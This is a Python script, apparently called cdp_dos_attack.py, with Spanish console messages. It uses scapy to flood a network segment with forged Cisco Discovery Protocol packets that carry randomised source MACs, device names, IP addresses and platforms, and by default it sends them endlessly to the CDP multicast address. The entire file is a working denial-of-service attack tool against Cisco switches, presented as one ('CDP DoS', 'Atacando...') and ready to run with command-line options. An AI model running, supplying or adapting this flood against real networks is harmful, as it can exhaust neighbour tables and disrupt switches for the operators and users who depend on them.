import argparse
import random
import signal
import struct
import sys
import time
import os
from datetime import datetime
from scapy.all import Ether, LLC, SNAP, Raw, sendp, conf

CDP_MULTICAST_MAC = "01:00:0c:cc:cc:cc"
CDP_SNAP_OUI = 0x00000c
CDP_SNAP_PID = 0x2000
TLV_DEVICE_ID = 0x0001
TLV_ADDRESS = 0x0002
TLV_PORT_ID = 0x0003
TLV_CAPABILITIES = 0x0004
TLV_VERSION = 0x0005
TLV_PLATFORM = 0x0006

PLATAFORMAS = [b"Cisco IOS 15.2", b"Cisco Catalyst 2960", b"Cisco Catalyst 3750"]
IFACE_TYPES = ["GigabitEthernet", "FastEthernet", "Ethernet"]
stats = {"sent": 0, "errors": 0, "start": None}

def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def random_ip():
    first = random.choice([10, 172, 192])
    return f"{first}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

def random_device_id():
    suffix = random.choice(["Router","Switch","Core","Edge","Access"])
    return f"Cisco-{suffix}-{random.randint(1000,9999)}".encode()

def random_port_id():
    iface = random.choice(IFACE_TYPES)
    return f"{iface}{random.randint(0,3)}/{random.randint(0,24)}".encode()

def build_tlv(tlv_type, value):
    length = 4 + len(value)
    return struct.pack("!HH", tlv_type, length) + value

def build_tlv_address(ip_str):
    ip_bytes = bytes(int(x) for x in ip_str.split("."))
    addr_entry = b"\x01\x01\xcc\x00\x04" + ip_bytes
    payload = struct.pack("!I", 1) + addr_entry
    return build_tlv(TLV_ADDRESS, payload)

def build_cdp_checksum(data):
    if len(data) % 2 != 0:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        s += word
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff

def build_cdp_packet(src_mac, dst_mac):
    device_id = random_device_id()
    port_id = random_port_id()
    platform = random.choice(PLATAFORMAS)
    ip_addr = random_ip()
    cap = struct.pack("!I", random.choice([0x00000029, 0x00000011]))
    version = b"Cisco IOS Software, Version 15.x"
    tlvs  = build_tlv(TLV_DEVICE_ID, device_id)
    tlvs += build_tlv_address(ip_addr)
    tlvs += build_tlv(TLV_PORT_ID, port_id)
    tlvs += build_tlv(TLV_CAPABILITIES, cap)
    tlvs += build_tlv(TLV_VERSION, version)
    tlvs += build_tlv(TLV_PLATFORM, platform)
    cdp_no_cksum = struct.pack("!BBH", 2, 180, 0) + tlvs
    cksum = build_cdp_checksum(cdp_no_cksum)
    cdp_payload = struct.pack("!BBH", 2, 180, cksum) + tlvs
    eth = Ether(src=src_mac, dst=dst_mac)
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=CDP_SNAP_PID)
    return eth / llc / snap / Raw(load=cdp_payload)

def print_stats():
    elapsed = time.time() - stats["start"] if stats["start"] else 0
    pps = stats["sent"] / elapsed if elapsed > 0 else 0
    print(f"\n\nPaquetes enviados: {stats['sent']} | Tiempo: {elapsed:.2f}s | {pps:.1f} pkt/s")

def signal_handler(sig, frame):
    print_stats()
    sys.exit(0)

def cdp_flood(interface, dst_mac, count, delay, verbose):
    print(f"[*] CDP DoS | iface={interface} | dst={dst_mac} | count={'inf' if count==0 else count}")
    print("[*] Atacando... Ctrl+C para detener.\n")
    conf.verb = 0
    stats["start"] = time.time()
    i = 0
    while count == 0 or i < count:
        src_mac = random_mac()
        try:
            pkt = build_cdp_packet(src_mac, dst_mac)
            sendp(pkt, iface=interface, verbose=False)
            stats["sent"] += 1
            if verbose:
                print(f"  [+] #{stats['sent']:>5} src={src_mac}")
            elif stats["sent"] % 100 == 0:
                elapsed = time.time() - stats["start"]
                pps = stats["sent"] / elapsed if elapsed > 0 else 0
                print(f"\r  [*] Enviados: {stats['sent']} | {pps:.0f} pkt/s", end="", flush=True)
        except Exception as e:
            stats["errors"] += 1
            if verbose:
                print(f"  [!] Error: {e}")
        if delay > 0:
            time.sleep(delay)
        i += 1
    print_stats()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Requiere root: sudo python3 cdp_dos_attack.py -i eth0")
        sys.exit(1)
    signal.signal(signal.SIGINT, signal_handler)
    p = argparse.ArgumentParser()
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("-t", "--target", default=CDP_MULTICAST_MAC)
    p.add_argument("-c", "--count", type=int, default=0)
    p.add_argument("-d", "--delay", type=float, default=0.0)
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()
    cdp_flood(args.interface, args.target, args.count, args.delay, args.verbose)
